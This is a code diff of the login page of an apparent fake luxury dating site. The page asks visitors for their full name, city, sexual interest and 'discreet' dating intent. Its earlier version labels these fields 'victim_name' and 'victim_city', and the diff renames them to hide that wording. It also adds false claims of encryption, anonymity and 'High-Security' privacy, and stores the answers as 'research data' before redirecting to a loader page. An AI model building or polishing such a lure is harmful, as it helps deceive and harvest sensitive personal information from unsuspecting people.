@@ -3,68 +3,98 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PureMatch | Verified Elite Connections</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;600&display=swap" rel="stylesheet">
+    <title>PureMatch Elite | Luxury Verified Dating</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
     <style>
-        body, html { height: 100%; margin: 0; font-family: 'Inter', sans-serif; background: #1a1a1a; color: white; }
+        body, html { height: 100%; margin: 0; font-family: 'Inter', sans-serif; background: #0a0a0a; color: white; overflow-x: hidden; }
         .hero-bg {
-            background-image: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.6)), url('https://images.unsplash.com/photo-1516589174184-c68526614467?auto=format&fit=crop&w=1920&q=80');
-            height: 100%; background-position: center; background-size: cover;
+            background-image: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)), url('https://images.unsplash.com/photo-1511707171634-5f897ff02aa9?auto=format&fit=crop&w=1920&q=80');
+            height: 100vh; background-position: center; background-size: cover;
             display: flex; align-items: center; justify-content: center;
         }
         .login-box {
-            background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(20px);
-            padding: 40px; border-radius: 24px; border: 1px solid rgba(255,255,255,0.1);
-            width: 320px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            background: rgba(20, 20, 20, 0.85); backdrop-filter: blur(25px);
+            padding: 40px; border-radius: 30px; border: 1px solid rgba(255,255,255,0.1);
+            width: 350px; text-align: center; box-shadow: 0 25px 50px rgba(0,0,0,0.6);
         }
-        h1 { font-weight: 600; margin-bottom: 8px; font-size: 2.2rem; letter-spacing: -1px; }
-        p { font-weight: 300; font-size: 0.9rem; margin-bottom: 24px; opacity: 0.8; }
-        input {
-            width: 100%; padding: 14px; margin-bottom: 12px; border-radius: 12px;
-            border: none; background: rgba(255,255,255,0.9); font-size: 1rem; color: #333; box-sizing: border-box;
+        h1 { font-weight: 600; margin-bottom: 5px; font-size: 2.2rem; letter-spacing: -1.5px; color: #fff; }
+        .tagline { font-weight: 300; font-size: 0.85rem; margin-bottom: 30px; color: #ff4b2b; text-transform: uppercase; letter-spacing: 2px; }
+        
+        label { display: block; text-align: left; font-size: 11px; text-transform: uppercase; margin-bottom: 5px; opacity: 0.6; padding-left: 5px; }
+        input, select {
+            width: 100%; padding: 15px; margin-bottom: 15px; border-radius: 12px;
+            border: 1px solid rgba(255,255,255,0.1); background: rgba(255,255,255,0.05); 
+            font-size: 1rem; color: white; box-sizing: border-box; outline: none;
         }
+        input:focus, select:focus { border-color: #ff4b2b; background: rgba(255,255,255,0.1); }
+        
         .btn-start {
-            width: 100%; padding: 16px; border: none; border-radius: 12px;
-            background: #ff4b2b; color: white; font-weight: 600;
-            cursor: pointer; transition: 0.3s; font-size: 1rem;
+            width: 100%; padding: 18px; border: none; border-radius: 12px;
+            background: linear-gradient(45deg, #ff416c, #ff4b2b); color: white; font-weight: 600;
+            cursor: pointer; transition: 0.3s; font-size: 1.1rem; margin-top: 10px;
+            box-shadow: 0 10px 20px rgba(255, 75, 43, 0.3);
         }
-        .btn-start:hover { background: #ff310d; transform: scale(1.02); }
-        .secure-tag { font-size: 0.75rem; margin-top: 15px; color: #4ade80; display: flex; align-items: center; justify-content: center; gap: 5px; }
+        .btn-start:hover { transform: translateY(-2px); box-shadow: 0 15px 25px rgba(255, 75, 43, 0.4); }
+        
+        .footer-info { font-size: 0.7rem; margin-top: 20px; opacity: 0.5; line-height: 1.4; }
+        .verified-badge { color: #4ade80; font-size: 0.75rem; font-weight: bold; margin-bottom: 15px; display: block; }
     </style>
 </head>
 <body>
 
 <div class="hero-bg">
     <div class="login-box">
+        <span class="verified-badge">✓ ENCRYPTED & ANONYMOUS</span>
         <h1>PureMatch</h1>
-        <p>Join the elite local network.</p>
+        <div class="tagline">Elite Members Only</div>
         
-        <input type="text" id="victim_name" placeholder="Your Name" required>
-        <input type="text" id="victim_city" placeholder="City (e.g. Houston, TX)" required>
+        <label>Your Identity</label>
+        <input type="text" id="v_name" placeholder="Full Name" required>
+        
+        <label>Current Location</label>
+        <input type="text" id="v_city" placeholder="City, State (e.g. Dallas, TX)" required>
 
-        <button class="btn-start" onclick="saveAndNext()">See Matches Near Me</button>
+        <label>Interested In</label>
+        <select id="v_interest">
+            <option value="Women">Seeking Women</option>
+            <option value="Men">Seeking Men</option>
+            <option value="Both">Seeking Both</option>
+        </select>
 
-        <div class="secure-tag">
-            <span>🛡️</span> 256-bit SSL Secure Verification
+        <label>Dating Intent</label>
+        <select id="v_intent">
+            <option value="Casual">Casual Hookups</option>
+            <option value="Elite">Elite Networking</option>
+            <option value="Discreet">Discreet Encounters</option>
+        </select>
+
+        <button class="btn-start" onclick="processLogin()">Explore Matches</button>
+
+        <div class="footer-info">
+            By entering, you agree to our High-Security Privacy Policy. <br>
+            © 2026 PureMatch Global Elite.
         </div>
     </div>
 </div>
 
 <script>
-    function saveAndNext() {
-        // 1. Capture what the user typed
-        const nameVal = document.getElementById('victim_name').value;
-        const cityVal = document.getElementById('victim_city').value;
+    function processLogin() {
+        const name = document.getElementById('v_name').value;
+        const city = document.getElementById('v_city').value;
+        const interest = document.getElementById('v_interest').value;
+        const intent = document.getElementById('v_intent').value;
         
-        if(nameVal.trim() !== "" && cityVal.trim() !== "") {
-            // 2. Store it so the next page knows who you are
-            sessionStorage.setItem('userName', nameVal);
-            sessionStorage.setItem('userCity', cityVal);
+        if(name.trim() && city.trim()) {
+            // Store all detailed research data
+            sessionStorage.setItem('userName', name);
+            sessionStorage.setItem('userCity', city);
+            sessionStorage.setItem('userInterest', interest);
+            sessionStorage.setItem('userIntent', intent);
             
-            // 3. MOVE TO THE LOADER PAGE
+            // Move to loader
             window.location.href = "matching_loader.html"; 
         } else {
-            alert("Please enter your name and city to continue.");
+            alert("Security Protocol: Please complete all fields to verify your identity.");
         }
     }
 </script>
